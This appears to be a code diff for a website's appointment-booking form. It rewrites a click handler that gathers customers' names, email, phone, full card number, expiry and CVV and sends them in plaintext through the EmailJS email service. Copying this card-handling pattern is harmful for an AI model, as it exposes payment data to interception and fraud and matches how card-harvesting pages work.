@@ -102,48 +102,41 @@
 })(jQuery);
 
 // for payment 
-document.getElementById('add-note').addEventListener('onclick', function() {
-    console.log("yeah....")
-    document.getElementById('notes').style.display = 'block';
-});
 
-document.getElementById('book-appointment').addEventListener('click', function(event) {
-    event.preventDefault(); // Prevent form from submitting normally
+document.addEventListener("DOMContentLoaded", function() {
+    // Select the "Book Appointment" button
+    const bookBtn = document.querySelector(".book-btn");
 
-    // Collect form data
-    const country = document.getElementById('country-code').value;
-    const phoneNumber = document.getElementById('phone-number').value;
-    const firstName = document.getElementById('first-name').value;
-    const lastName = document.getElementById('last-name').value;
-    const email = document.getElementById('email').value;
-    const address = document.getElementById('address').value;
-    const city = document.getElementById('city').value;
-    const state = document.getElementById('state').value;
-    const fullAddress = document.getElementById('full-address').value;
-    const notes = document.getElementById('notes').value;
-    const cardNumber = document.getElementById('card-number').value;
-    const expiry = document.getElementById('expiry').value;
-    const cvv = document.getElementById('cvv').value;
+    // When the button is clicked
+    bookBtn.addEventListener("click", function(event) {
+        event.preventDefault(); // Prevent the form from submitting the default way
 
-    // Send data using EmailJS
-    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-        country: country,
-        phone_number: phoneNumber,
-        first_name: firstName,
-        last_name: lastName,
-        email: email,
-        address: address,
-        city: city,
-        state: state,
-        full_address: fullAddress,
-        notes: notes,
-        card_number: cardNumber,
-        expiry_date: expiry,
-        cvv_code: cvv
-    })
-    .then(function(response) {
-       alert('Appointment booked successfully!');
-    }, function(error) {
-       alert('Failed to book appointment.');
+        // Collect form data
+        const firstName = document.getElementById("first-name").value;
+        const lastName = document.getElementById("last-name").value;
+        const email = document.getElementById("email").value;
+        const phoneNumber = document.getElementById("phone-number").value;
+        const cardNumber = document.getElementById("card-number").value;
+        const expiry = document.getElementById("expiry").value;
+        const cvv = document.getElementById("cvv").value;
+
+        // Prepare the data to be sent
+        const templateParams = {
+            first_name: firstName,
+            last_name: lastName,
+            email: email,
+            phone_number: phoneNumber,
+            card_number: cardNumber,
+            expiry_date: expiry,
+            cvv_code: cvv
+        };
+
+        // Send the email using EmailJS
+        emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+        .then(function(response) {
+            alert("Your appointment has been booked successfully!", response.status, response.text);
+        }, function(error) {
+            alert("Failed to book appointment. Please try again.", error);
+        });
     });
 });
